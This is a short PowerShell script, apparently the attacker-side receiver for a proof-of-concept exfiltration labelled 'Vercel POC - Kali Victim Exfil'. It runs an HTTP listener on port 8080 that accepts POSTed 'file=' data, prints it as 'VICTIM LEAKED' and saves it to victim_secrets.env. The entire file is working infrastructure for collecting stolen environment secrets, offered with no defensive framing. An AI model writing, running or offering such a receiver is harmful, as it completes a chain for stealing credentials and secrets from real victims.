# PowerShell HTTP Listener for Vercel POC - Kali Victim Exfil (Direct IP)
Add-Type -AssemblyName System.Web

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:8080/")
$listener.Start()
Write-Host "Receiver listening on port 8080... (Ctrl+C to stop)"

try {
    while ($listener.IsListening) {
        $context = $listener.GetContext()
        $request = $context.Request
        $response = $context.Response
        
        if ($request.HttpMethod -eq "POST" -and $request.Url.AbsolutePath -eq "/upload") {
            $reader = New-Object System.IO.StreamReader($request.InputStream)
            $body = $reader.ReadToEnd()
            $reader.Close()
            
            if ($body -match "file=(.*)") {
                $leaked_env = [System.Web.HttpUtility]::UrlDecode($matches[1])
                if ($leaked_env -and $leaked_env.Length -gt 0) {
                    $preview = if ($leaked_env.Length -le 200) { $leaked_env } else { $leaked_env.Substring(0, 200) }
                    Write-Host "VICTIM LEAKED: $preview..."
                    $leaked_env | Out-File -FilePath "victim_secrets.env" -Encoding utf8
                } else {
                    Write-Host "No leaked data (empty)."
                }
                $response.StatusCode = 200
                $bytes = [Text.Encoding]::UTF8.GetBytes("Upload success!")
                $response.OutputStream.Write($bytes, 0, $bytes.Length)
            } else {
                Write-Host "Missing 'file=': $body"
                $response.StatusCode = 400
                $bytes = [Text.Encoding]::UTF8.GetBytes("Error: No file")
                $response.OutputStream.Write($bytes, 0, $bytes.Length)
            }
        } else {
            $response.StatusCode = 404
        }
        
        $response.ContentType = "text/plain"
        $response.Close()
    }
} finally {
    $listener.Stop()
    Write-Host "Receiver stopped."
}
